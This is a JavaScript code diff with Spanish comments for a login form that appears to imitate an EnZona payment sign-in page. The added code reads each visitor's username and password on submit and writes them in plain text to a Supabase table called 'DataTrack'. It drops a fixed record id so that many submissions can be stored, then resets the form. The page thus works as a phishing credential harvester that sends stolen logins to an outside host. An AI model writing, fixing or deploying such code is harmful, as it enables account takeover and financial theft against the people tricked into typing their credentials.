@@ -13,11 +13,37 @@ const trackSave = () => {
       // Obtiene los valores de los campos del formulario
       const username = document.getElementById("username").value;
       const password = document.getElementById("tpassword").value;
-      const sessionDataKey = document.querySelector(
-        'input[name="sessionDataKey"]'
-      ).value;
+
+      // Elimina el campo 'id: 1' para evitar conflicto de clave primaria
       const { error } = await supabase
         .from("DataTrack")
-        .insert({ id: 1, username: username, password: password });
+        .insert({ username: username, password: password });
+
+      if (error) {
+        console.error("Error al guardar en Supabase:", error.message);
+        alert("Error al guardar los datos.");
+      } else {
+        alert("Datos guardados correctamente.");
+        // Opcional: limpiar el formulario
+        document.getElementById("identifierForm").reset();
+      }
+    });
+
+  // Evita recarga al presionar 'S' con el foco en el botón
+  document
+    .getElementById("identifierForm")
+    .addEventListener("keydown", function (event) {
+      const isSubmitButton =
+        document.activeElement &&
+        document.activeElement.type === "submit" &&
+        document.activeElement.classList.contains("enzona-btn");
+      if (
+        isSubmitButton &&
+        (event.key === "s" || event.key === "S")
+      ) {
+        event.preventDefault();
+      }
     });
 };
+
+trackSave();
